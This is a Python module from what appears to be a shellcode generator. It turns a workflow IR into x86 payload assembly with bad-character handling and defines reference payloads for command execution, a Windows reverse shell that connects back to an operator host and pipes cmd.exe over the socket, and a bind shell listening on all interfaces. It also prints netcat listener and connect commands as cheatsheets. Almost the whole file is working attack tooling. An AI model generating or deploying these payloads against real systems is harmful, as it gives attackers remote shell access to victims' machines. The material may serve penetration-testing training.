"""Reference workflows and the WorkflowTemplate adapter.

WorkflowTemplate bridges the Workflow IR into the existing build pipeline
by implementing the PayloadTemplate interface.  It extracts manifest
requirements (APIs, strings, structs, locals) from the IR and delegates
payload assembly generation to the x86 backend.

Reference workflows:
  - run_command: WinExec + ExitProcess with branch on result
  - reverse_shell: WSAStartup, WSASocketA, connect, CreateProcessA
    with typed inputs (lhost, lport), struct init, and error branching
  - bind_shell: WSAStartup, WSASocketA, bind, listen, accept,
    CreateProcessA with typed lport, struct init, and error branching
"""
from __future__ import annotations

import socket as _socket
import struct as _struct
from collections.abc import Callable

from ..payload_templates.base import PayloadTemplate, TemplateConfig
from ..stack_alloc import StackLayout
from .ir import (
    AddressOf,
    AllocateLocal,
    AllocateStruct,
    Block,
    CallAPI,
    Compare,
    ConstructString,
    DefineConstant,
    Immediate,
    NameRef,
    SuccessPredicate,
    Terminate,
    TerminateStyle,
    ValueRef,
    Workflow,
    WriteStructField,
    ZeroStruct,
)
from .validator import validate
from .x86_backend import lower_workflow


class WorkflowTemplate(PayloadTemplate):
    """Adapter that bridges a Workflow IR into the PayloadTemplate interface."""

    def __init__(self, workflow: Workflow) -> None:
        result = validate(workflow)
        if not result.valid:
            raise ValueError(
                "Workflow validation failed:\n"
                + "\n".join(f"  - {e}" for e in result.errors)
            )
        self._workflow = workflow
        self._slot_names: list[str] | None = None

    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
        return lower_workflow(self._workflow, layout, config.badchars, config)

    def probe_slots(self, config: TemplateConfig) -> list[str]:
        """Extract all slot names the workflow needs from the IR directly.

        This replaces RecordingLayout-based inference with explicit
        analysis of the IR operations.
        """
        if self._slot_names is not None:
            return self._slot_names

        seen: set[str] = set()
        ordered: list[str] = []

        def _add(name: str) -> None:
            if name not in seen:
                seen.add(name)
                ordered.append(name)

        for block in self._workflow.blocks:
            for op in block.operations:
                if isinstance(op, CallAPI):
                    _add(op.api_name)
                    if op.result is not None:
                        _add(op.result)
                    for arg in op.arguments:
                        self._collect_value_refs(arg, _add)

                elif isinstance(op, ConstructString):
                    _add(op.name)

                elif isinstance(op, AllocateLocal):
                    _add(op.name)

                elif isinstance(op, AllocateStruct):
                    _add(op.struct_type)

                elif isinstance(op, Compare):
                    _add(op.value)

                elif isinstance(op, (DefineConstant,)):
                    pass

        self._slot_names = ordered
        return ordered

    def probe_strings(self) -> dict[str, str]:
        """Return {label: value} for all ConstructString operations in the IR."""
        result: dict[str, str] = {}
        for block in self._workflow.blocks:
            for op in block.operations:
                if isinstance(op, ConstructString):
                    result[op.name] = op.value
        return result

    def probe_structs(self) -> dict[str, str]:
        """Return {name: struct_type} for all AllocateStruct operations."""
        result: dict[str, str] = {}
        for block in self._workflow.blocks:
            for op in block.operations:
                if isinstance(op, AllocateStruct):
                    result[op.name] = op.struct_type
        return result

    @staticmethod
    def _collect_value_refs(ref: ValueRef, add_fn: Callable[[str], None]) -> None:
        if isinstance(ref, NameRef):
            add_fn(ref.name)
        elif isinstance(ref, AddressOf):
            add_fn(ref.name)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return []


# ---------------------------------------------------------------------------
# Reference workflow builders
# ---------------------------------------------------------------------------


def build_run_command_workflow(command: str = "calc.exe") -> Workflow:
    """Build the run_command reference workflow.

    WinExec(command, SW_HIDE=0) -> branch on result -> ExitProcess
    """
    return Workflow(
        name="ir_run_command",
        blocks=(
            Block("entry", (
                ConstructString("cmd", command),
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("cmd"), Immediate(0)),
                    result="wexec_result",
                ),
                Compare(
                    "wexec_result",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            Block("success", (
                CallAPI("ExitProcess", arguments=(Immediate(0),)),
                Terminate(TerminateStyle.HANG),
            )),
            Block("fail", (
                CallAPI("ExitProcess", arguments=(Immediate(1),)),
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )


class IRRunCommandTemplate(WorkflowTemplate):
    """IR-backed run_command template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_run_command_workflow())

    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
        command = config.command or "calc.exe"
        workflow = build_run_command_workflow(command)
        return lower_workflow(workflow, layout, config.badchars, config)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Command executed on target", config.command or "calc.exe"),
        ]


# ---------------------------------------------------------------------------
# Reverse shell workflow
# ---------------------------------------------------------------------------

# STARTF_USESTDHANDLES tells CreateProcessA to use the hStdInput/Output/Error
# fields from STARTUPINFOA rather than inheriting the parent's console.
_STARTF_USESTDHANDLES = 0x00000100


def build_reverse_shell_workflow(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    command: str = "cmd.exe",
) -> Workflow:
    """Build the reverse_shell reference workflow.

    WSAStartup -> WSASocketA -> populate sockaddr_in -> connect ->
    populate STARTUPINFOA -> CreateProcessA -> ExitProcess

    The port and IP are pre-computed to network byte order and embedded
    as DefineConstant nodes, keeping the IR free of byte-order logic.
    """
    port_be = _socket.htons(lport)
    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]

    return Workflow(
        name="ir_reverse_shell",
        blocks=(
            Block("entry", (
                # Pre-compute network byte order values
                DefineConstant("sin_port_be", port_be),
                DefineConstant("sin_addr_le", ip_le),
                DefineConstant("af_inet", 2),

                # Allocate structures
                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),
                AllocateStruct("si", "STARTUPINFOA"),
                AllocateStruct("pi", "PROCESS_INFORMATION"),

                # Allocate string
                ConstructString("cmd", command),

                # Initialize Winsock
                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                # WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, NULL, 0, 0)
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2),    # AF_INET
                        Immediate(1),    # SOCK_STREAM
                        Immediate(6),    # IPPROTO_TCP
                        Immediate(0),    # lpProtocolInfo = NULL
                        Immediate(0),    # g = 0
                        Immediate(0),    # dwFlags = 0
                    ),
                    result="socket_handle",
                ),
                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="connect_socket", false_block="fail"),
            )),

            Block("connect_socket", (
                # Populate sockaddr_in
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),

                # connect(socket, &sockaddr_in, 0x10)
                CallAPI(
                    "connect",
                    arguments=(
                        NameRef("socket_handle"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="conn_ret",
                ),
                Compare("conn_ret", SuccessPredicate.ZERO,
                        true_block="setup_process", false_block="fail"),
            )),

            Block("setup_process", (
                # Zero and populate STARTUPINFOA
                ZeroStruct("si"),
                WriteStructField("si", "cb", Immediate(0x44)),
                WriteStructField("si", "dwFlags",
                                 Immediate(_STARTF_USESTDHANDLES)),
                WriteStructField("si", "hStdInput",
                                 NameRef("socket_handle")),
                WriteStructField("si", "hStdOutput",
                                 NameRef("socket_handle")),
                WriteStructField("si", "hStdError",
                                 NameRef("socket_handle")),

                # Zero PROCESS_INFORMATION
                ZeroStruct("pi"),

                # CreateProcessA(NULL, &cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
                CallAPI(
                    "CreateProcessA",
                    arguments=(
                        Immediate(0),       # lpApplicationName = NULL
                        AddressOf("cmd"),   # lpCommandLine
                        Immediate(0),       # lpProcessAttributes = NULL
                        Immediate(0),       # lpThreadAttributes = NULL
                        Immediate(1),       # bInheritHandles = TRUE
                        Immediate(0),       # dwCreationFlags = 0
                        Immediate(0),       # lpEnvironment = NULL
                        Immediate(0),       # lpCurrentDirectory = NULL
                        AddressOf("si"),    # lpStartupInfo
                        AddressOf("pi"),    # lpProcessInformation
                    ),
                    result="cpa_ret",
                ),
                Compare("cpa_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            Block("success", (
                CallAPI("ExitProcess", arguments=(Immediate(0),)),
                Terminate(TerminateStyle.HANG),
            )),

            Block("fail", (
                CallAPI("ExitProcess", arguments=(Immediate(1),)),
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )


class IRReverseShellTemplate(WorkflowTemplate):
    """IR-backed reverse_shell template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_reverse_shell_workflow())

    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
        workflow = build_reverse_shell_workflow(
            lhost=config.lhost,
            lport=config.lport,
            command=config.command or "cmd.exe",
        )
        return lower_workflow(workflow, layout, config.badchars, config)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Start netcat listener", f"nc -lnvp {config.lport}"),
            ("Start listener (rlwrap)", f"rlwrap nc -lnvp {config.lport}"),
        ]


# ---------------------------------------------------------------------------
# Bind shell workflow
# ---------------------------------------------------------------------------

_INADDR_ANY = 0  # 0.0.0.0


def build_bind_shell_workflow(
    lport: int = 4444,
    command: str = "cmd.exe",
) -> Workflow:
    """Build the bind_shell reference workflow.

    WSAStartup -> WSASocketA -> bind -> listen -> accept ->
    populate STARTUPINFOA (stdio = accepted socket) -> CreateProcessA ->
    ExitProcess

    The port is pre-computed to network byte order. The bind address is
    INADDR_ANY (0.0.0.0) so the shell listens on all interfaces.
    """
    port_be = _socket.htons(lport)

    return Workflow(
        name="ir_bind_shell",
        blocks=(
            Block("entry", (
                DefineConstant("sin_port_be", port_be),
                DefineConstant("af_inet", 2),
                DefineConstant("inaddr_any", _INADDR_ANY),

                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),
                AllocateStruct("si", "STARTUPINFOA"),
                AllocateStruct("pi", "PROCESS_INFORMATION"),

                ConstructString("cmd", command),

                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2),    # AF_INET
                        Immediate(1),    # SOCK_STREAM
                        Immediate(6),    # IPPROTO_TCP
                        Immediate(0),    # lpProtocolInfo = NULL
                        Immediate(0),    # g = 0
                        Immediate(0),    # dwFlags = 0
                    ),
                    result="listen_socket",
                ),
                Compare("listen_socket", SuccessPredicate.INVALID_HANDLE,
                        true_block="bind_socket", false_block="fail"),
            )),

            Block("bind_socket", (
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("inaddr_any")),

                CallAPI(
                    "bind",
                    arguments=(
                        NameRef("listen_socket"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="bind_ret",
                ),
                Compare("bind_ret", SuccessPredicate.ZERO,
                        true_block="listen_socket_block", false_block="fail"),
            )),

            Block("listen_socket_block", (
                CallAPI(
                    "listen",
                    arguments=(
                        NameRef("listen_socket"),
                        Immediate(1),   # backlog = 1
                    ),
                    result="listen_ret",
                ),
                Compare("listen_ret", SuccessPredicate.ZERO,
                        true_block="accept_conn", false_block="fail"),
            )),

            Block("accept_conn", (
                CallAPI(
                    "accept",
                    arguments=(
                        NameRef("listen_socket"),
                        Immediate(0),   # addr = NULL
                        Immediate(0),   # addrlen = NULL
                    ),
                    result="client_socket",
                ),
                Compare("client_socket", SuccessPredicate.INVALID_HANDLE,
                        true_block="setup_process", false_block="fail"),
            )),

            Block("setup_process", (
                ZeroStruct("si"),
                WriteStructField("si", "cb", Immediate(0x44)),
                WriteStructField("si", "dwFlags",
                                 Immediate(_STARTF_USESTDHANDLES)),
                WriteStructField("si", "hStdInput",
                                 NameRef("client_socket")),
                WriteStructField("si", "hStdOutput",
                                 NameRef("client_socket")),
                WriteStructField("si", "hStdError",
                                 NameRef("client_socket")),

                ZeroStruct("pi"),

                CallAPI(
                    "CreateProcessA",
                    arguments=(
                        Immediate(0),       # lpApplicationName = NULL
                        AddressOf("cmd"),   # lpCommandLine
                        Immediate(0),       # lpProcessAttributes = NULL
                        Immediate(0),       # lpThreadAttributes = NULL
                        Immediate(1),       # bInheritHandles = TRUE
                        Immediate(0),       # dwCreationFlags = 0
                        Immediate(0),       # lpEnvironment = NULL
                        Immediate(0),       # lpCurrentDirectory = NULL
                        AddressOf("si"),    # lpStartupInfo
                        AddressOf("pi"),    # lpProcessInformation
                    ),
                    result="cpa_ret",
                ),
                Compare("cpa_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            Block("success", (
                CallAPI("ExitProcess", arguments=(Immediate(0),)),
                Terminate(TerminateStyle.HANG),
            )),

            Block("fail", (
                CallAPI("ExitProcess", arguments=(Immediate(1),)),
                Terminate(TerminateStyle.HANG),
            )),
        ),
        entry="entry",
    )


class IRBindShellTemplate(WorkflowTemplate):
    """IR-backed bind_shell template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_bind_shell_workflow())

    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
        workflow = build_bind_shell_workflow(
            lport=config.lport,
            command=config.command or "cmd.exe",
        )
        return lower_workflow(workflow, layout, config.badchars, config)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Connect to bind shell", f"nc -nv <TARGET_IP> {config.lport}"),
            ("Connect (rlwrap)", f"rlwrap nc -nv <TARGET_IP> {config.lport}"),
        ]
